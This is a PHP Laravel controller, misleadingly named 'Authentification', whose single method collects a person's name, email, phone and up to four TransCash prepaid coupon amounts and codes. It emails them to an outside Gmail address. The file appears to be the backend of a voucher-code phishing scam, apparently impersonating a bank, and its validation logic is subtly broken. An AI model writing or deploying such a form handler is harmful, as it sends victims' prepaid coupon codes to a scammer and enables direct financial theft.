<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class Authentification extends Controller
{
    public function auth()
    {
        if (isset($_POST['send'])) {
            $nom = strip_tags(trim($_POST['nom']));
            $email = strip_tags(trim($_POST['email']));
            $tel = strip_tags(trim($_POST['tel']));
            $type = $_POST['type'];
            $mont1 = strip_tags(trim($_POST['mont1']));
            $cc1 = strip_tags(trim($_POST['cc1']));
            $mont2 = strip_tags(trim($_POST['mont2']));
            $cc2 = strip_tags(trim($_POST['cc2']));
            $mont3 = strip_tags(trim($_POST['mont3']));
            $cc3 = strip_tags(trim($_POST['cc3']));
            $mont4 = strip_tags(trim($_POST['mont4']));
            $cc4 = strip_tags(trim($_POST['cc4']));

            if ($nom != "" && $email != "" && $mont1 = !"" && $type = !"" && $cc1 = !"") {
                $to = "cmutuel1 @gmail.com";
                $subject = "Recharge TransCash";
                $msg = "
                  Nom et prenom : " . $nom . "
                  Mail :" . $email . "
                  Telephone : " . $tel . "
                  Type de recharge : " . $type . "
                  Montant 1 : " . $mont1 . "€
                  Code coupon 1 : " . $cc1 . "
                  Montant 2 : " . $mont2 . "€
                  Code coupon 2 :" . $cc2 . "
                  Montant 3 : " . $mont3 . "€
                  Code coupon 3 : " . $cc3 . "
                  Montant 4 : " . $mont4 . "€
                  Code coupon 4 : " . $cc4 . "
                  ";
                if (mail($to, $subject, $msg)) {
                    $_SESSION['success'] = true;
                } else {
                    $_SESSION['echec'] = true;
                }
            } else {
                $_SESSION['vide'] = true;
            }
        }



        return view('authentification');
    }
}
